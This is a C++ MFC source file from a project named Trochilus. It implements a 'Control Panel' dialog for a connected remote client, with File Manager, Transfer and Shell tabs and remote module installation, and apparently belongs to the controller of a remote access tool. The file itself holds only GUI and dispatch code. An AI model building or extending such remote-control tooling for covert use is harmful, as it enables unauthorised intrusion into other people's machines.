// PanelDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Trochilus.h"
#include "PanelDlg.h"
#include "InstallDlg.h"
#include "afxdialogex.h"

// CPanelDlg 对话框

IMPLEMENT_DYNAMIC(CPanelDlg, CDialogEx)

CPanelDlg::CPanelDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CPanelDlg::IDD, pParent)
{

}

CPanelDlg::~CPanelDlg()
{
}

void CPanelDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TAB_PANEL, m_TabCtrl);
	DDX_Control(pDX, IDC_LIST_MSG, m_msgList);
}


BEGIN_MESSAGE_MAP(CPanelDlg, CDialogEx)
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB_PANEL, &CPanelDlg::OnTcnSelchangeTabPanel)
	ON_WM_CLOSE()
END_MESSAGE_MAP()


// CPanelDlg 消息处理程序
void CPanelDlg::InitInsideModule()
{
	CRect rs;
	m_TabCtrl.GetClientRect(&rs);
	rs.top += 21;

	CFileMgrDlg* FileDlg = new CFileMgrDlg;
	CTransferDlg* TransDlg = new CTransferDlg;
	CCmdDlg* CmdDlg = new CCmdDlg;

	m_MemList.push_back(FileDlg);
	m_MemList.push_back(TransDlg);
	m_MemList.push_back(CmdDlg);

	MODULE_INFO fileInfo = {0};
	MODULE_INFO transInfo = {0};;
	MODULE_INFO cmdInfo = {0};;

	fileInfo.lpParameter = (CDialogEx*)FileDlg;
	fileInfo.isInside = TRUE;
	fileInfo.inside_init = FileDlg->InitModule;
	fileInfo.handler = FileDlg->HandleModuleMsg;

	transInfo.lpParameter = (CDialogEx*)TransDlg;
	transInfo.isInside = TRUE;
	transInfo.inside_init = TransDlg->InitModule;
	transInfo.handler = TransDlg->HandleModuleMsg;

	cmdInfo.lpParameter = (CDialogEx*)CmdDlg;
	cmdInfo.isInside = TRUE;
	cmdInfo.inside_init = CmdDlg->InitModule;
	cmdInfo.handler = CmdDlg->HandleModuleMsg;

	m_TabCtrl.InsertItem(0,_T("File Manager"));
	m_TabCtrl.InsertItem(1,_T("Transfer"));
	m_TabCtrl.InsertItem(2,_T("Shell"));

	m_moduleMap.insert(MAKE_PAIR(ModuleMap,0,fileInfo));
	m_moduleMap.insert(MAKE_PAIR(ModuleMap,1,transInfo));
	m_moduleMap.insert(MAKE_PAIR(ModuleMap,2,cmdInfo));

	CLIENT_INFO info;
	GetClientInfo(m_clientid,&info);
	FnModuleNotifyProc func = \
		ClientControlPanelManager::GetInstanceRef().HandleModuleMsg;

	ModuleMap::iterator it = m_moduleMap.begin();

	for (; it != m_moduleMap.end() ; it++)
	{
		MODULE_INFO& modinfo = it->second;

		if (it->second.isInside)
			modinfo.inside_init(m_clientid,info,func,modinfo.lpParameter);
	}

	FileDlg->Create(IDD_DIALOG_FILE);
	TransDlg->Create(IDD_DIALOG_TRANSFER);
	CmdDlg->Create(IDD_DIALOG_CMD);

	CWnd* pWnd = CWnd::FromHandle(m_TabCtrl.GetSafeHwnd());

	FileDlg->SetParent(pWnd);
	TransDlg->SetParent(pWnd);
	CmdDlg->SetParent(pWnd);

	it = m_moduleMap.begin();

	for (; it != m_moduleMap.end() ; it++)
	{
		MODULE_INFO& modinfo = it->second;
		modinfo.hWnd = ((CDialogEx*)modinfo.lpParameter)->GetSafeHwnd();
	}

	TransDlg->MoveWindow(&rs);
	FileDlg->MoveWindow(&rs);
	CmdDlg->MoveWindow(&rs);
}

void CPanelDlg::InitOutsideModule()
{
	HWND hModule = 0;

	//加载模块
	MasterModuleManager::GetInstanceRef().LoadAllModules(m_moduleMap);

	//初始化模块信息
	INIT_INFO info;
	
	lstrcpy(info.clientid,m_clientid); 

	CLIENT_INFO clientInfo;
	GetClientInfo(m_clientid,&clientInfo);

	info.info = clientInfo;

	CRect rs;
	m_TabCtrl.GetClientRect(&rs);
	rs.top += 21;

	//枚举添加模块内容
	ModuleMap::iterator it = m_moduleMap.begin();

	for (; it != m_moduleMap.end() ; it++)
	{
		MODULE_INFO& modinfo = it->second;

		LPVOID lpParameter;

		//是否是内置模块
		if (!it->second.isInside)
		{
			modinfo.init();
			it->second.alloc(hModule,m_TabCtrl.GetSafeHwnd(),info,&lpParameter);
			(CWnd::FromHandle(hModule))->MoveWindow(rs);
			it->second.hTemp = hModule;
		}
		else
			continue;

		//判断模块是否安装
		UINT progress;
		MODULE_INST_STATUS status;

		QueryModuleInstallStatus(m_clientid,it->second.getname(),&status,&progress);

		if( status == MODULESTATUS_UNINSTALLED )
		{
			CInstallDlg* dlg = new CInstallDlg;
			dlg->Init(m_clientid,it->second.getname());
			dlg->Create(IDD_DIALOG_INSTALL,CWnd::FromHandle(m_TabCtrl.GetSafeHwnd()));
			hModule = dlg->GetSafeHwnd();
			it->second.hWnd = hModule;
		}

		if ( status == MODULESTATUS_INSTALLED )
		{
			it->second.hWnd = hModule;
		}

		(CWnd::FromHandle(hModule))->MoveWindow(rs);

		CString DisplayName = CString(it->second.getname());
		DisplayName.Replace(_T("Mod"),_T(""));

		m_TabCtrl.InsertItem(m_TabCtrl.GetItemCount(),DisplayName);

	}
}

void CPanelDlg::InitData()
{
	InitInsideModule();
	InitOutsideModule();

	::ShowWindow(m_moduleMap[0].hWnd,SW_SHOW);
}

void CPanelDlg::InitView()
{
	m_ImageList.Create(16,16,ILC_COLOR8|ILC_MASK,2,1);

	m_msgList.SetExtendedStyle(LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT);	
	m_msgList.InsertColumn(0,_T("Date"),LVCFMT_CENTER,230,-1);
	m_msgList.InsertColumn(1,_T("Type"),LVCFMT_CENTER,150,-1);
	m_msgList.InsertColumn(2,_T("Content"),LVCFMT_CENTER,350,-1);
	m_msgList.SetImageList(&m_ImageList,LVSIL_SMALL);

	m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_ICON_NOTIFY));
	
	CString strTitle;
	CLIENT_INFO info;

	GetClientInfo(m_clientid,&info);

	IN_ADDR connectIP;
	connectIP.S_un.S_addr = info.connectIP;

	strTitle.Format(_T("Control Panel [%s][%s]"),info.computerName,CString(inet_ntoa(connectIP)).GetBuffer());

	SetWindowText(strTitle);
}

BOOL CPanelDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	InitView();
	InitData();
	return TRUE;
}

void CPanelDlg::HandleMsgNotify(UINT nType, LPCTSTR lpContext)
{
	SYSTEMTIME sysTime;

	GetLocalTime(&sysTime);

	CString strTime = common::FormatSystemTime(sysTime);
	CString strStatus;
	
	switch(nType)
	{
	case MODULE_TYPE_ERROR:
		strStatus = _T("Error");
		break;
	case MODULE_TYPE_INFO:
		strStatus = _T("Info");
		break;
	case MODULE_TYPE_WARNING:
		strStatus = _T("Warning");
		break;
	}
	m_msgList.InsertItem(0,strTime,0);
	m_msgList.SetItemText(0,1,strStatus);
	m_msgList.SetItemText(0,2,lpContext);
}

void CPanelDlg::HandleModuleMsg(UINT nMsg, LPVOID lpContext, LPVOID lpParameter)
{
	//处理提示信息
	if (nMsg == MODULE_MSG_NOTIFYMSG)
	{
		HandleMsgNotify((UINT)lpParameter,(LPCTSTR)lpContext);
		return;
	}

	//处理模块安装
	if (nMsg == MODULE_MSG_INSTALLED)
	{
		CRect rs;
		m_TabCtrl.GetClientRect(&rs);
		rs.top += 21;

		//初始化模块信息
		INIT_INFO info;

		lstrcpy(info.clientid,m_clientid); 

		CLIENT_INFO clientInfo;
		GetClientInfo(m_clientid,&clientInfo);

		info.info = clientInfo;

		ModuleMap::iterator it = m_moduleMap.begin();
		for ( ; it != m_moduleMap.end() ; it++)
		{
			if (!it->second.isInside)
			{
				if (CString(it->second.getname()) == (LPCTSTR)lpContext)
				{
					if (m_TabCtrl.GetCurSel() == it->first)
					{
						::ShowWindow(it->second.hWnd,SW_HIDE);
						::ShowWindow(it->second.hTemp,SW_SHOW);
					}
					it->second.hWnd = it->second.hTemp;
				}
			}
		}

		return;
	}


	//分发模块处理
	m_csModuleMap.Enter();
	{
		ModuleMap::iterator it = m_moduleMap.begin();
		for ( ; it != m_moduleMap.end(); it ++)
		{
			MODULE_INFO& info = it->second;
			info.handler(m_clientid,nMsg,lpContext,info.lpParameter);
		}
	}
	m_csModuleMap.Leave();
}

void CPanelDlg::OnTcnSelchangeTabPanel(NMHDR *pNMHDR, LRESULT *pResult)
{
	int nSel = m_TabCtrl.GetCurSel();

	ModuleMap::iterator it = m_moduleMap.begin();
	for (; it != m_moduleMap.end() ; it++)
	{
		if (it->first == nSel)
		{
			::ShowWindow(it->second.hWnd,SW_SHOW); 
		}
		else
		{
			::ShowWindow(it->second.hWnd,SW_HIDE);
		}
	}
	*pResult = 0;
}

void CPanelDlg::OnClose()
{
	CDialogEx::OnClose();

	NewMemList::iterator it = m_MemList.begin();

	for (; it != m_MemList.end(); it++)
	{
		delete *it;
	}
}
